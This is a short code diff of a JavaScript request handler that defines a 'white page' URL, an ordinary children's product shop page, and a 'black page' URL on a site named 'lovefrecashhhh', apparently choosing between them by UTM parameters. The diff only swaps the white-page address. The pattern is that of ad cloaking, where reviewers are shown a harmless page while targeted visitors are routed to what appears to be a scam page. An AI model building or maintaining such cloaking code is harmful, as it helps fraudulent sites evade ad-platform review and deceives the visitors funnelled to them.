@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.littlethingz.be/en/djeco-stringing-chenille-creatures-craft-kit.html";
+    const whitePageURL = "https://www.buyon.pk/learning-art-children-projection-drawing-board-drawing-projector-table-for-kids-drawing-projector-for-tracing-improve-creativity-imagination";
     const blackPageURL = "https://lovefrecashhhh.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -26,4 +26,5 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
